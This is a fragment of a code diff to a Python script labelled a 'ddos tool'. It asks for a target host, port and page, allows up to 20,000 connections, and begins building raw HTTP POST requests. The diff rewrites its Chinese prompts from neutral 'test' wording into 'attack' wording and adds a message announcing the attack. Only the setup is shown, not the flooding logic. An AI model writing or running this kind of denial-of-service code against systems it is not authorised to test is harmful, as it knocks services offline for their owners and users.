@@ -5,9 +5,10 @@ import threading
 #Pressure Test,ddos tool
 #---------------------------
 MAX_CONN=20000
-PORT=int(input('请输入测试的端口：'))
-HOST=input('请输入要测试的域名/IP：')
-PAGE=input('请输入要测试的页面（默认输入/index.php）：')
+PORT=int(input('端口：'))
+HOST=input('IP/域名：')
+PAGE=input('攻击页面：')
+print('正在攻击%s，可以在上一句代码修改' % PAGE)
 #---------------------------
  
 buf=("POST %s HTTP/1.1\r\n"
